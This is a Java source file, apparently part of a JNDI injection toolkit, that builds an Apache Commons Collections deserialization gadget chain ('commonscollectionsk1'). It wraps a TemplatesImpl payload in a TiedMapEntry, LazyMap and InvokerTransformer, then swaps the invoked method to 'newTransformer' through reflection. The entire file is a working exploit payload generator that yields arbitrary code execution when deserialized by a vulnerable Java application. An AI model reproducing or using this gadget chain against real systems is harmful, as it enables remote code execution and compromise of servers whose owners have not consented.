package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.nu1r.jndi.gadgets.utils.Reflections;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

/**
 * Gadget chain:
 * HashMap
 * TiedMapEntry.hashCode
 * TiedMapEntry.getValue
 * LazyMap.decorate
 * InvokerTransformer
 * templates...
 */
public class commonscollectionsk1 implements ObjectPayload<Object> {

    public Object getObject(PayloadType type, String... param) throws Exception {
        Object                  tpl         = Gadgets.createTemplatesImpl(type, param);
        InvokerTransformer      transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        HashMap<String, String> innerMap    = new HashMap<String, String>();
        Map                     m           = LazyMap.decorate(innerMap, transformer);
        Map                     outerMap    = new HashMap();
        TiedMapEntry            tied        = new TiedMapEntry(m, tpl);
        outerMap.put(tied, "t");
        // clear the inner map data, this is important
        innerMap.clear();

        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        return outerMap;
    }
}
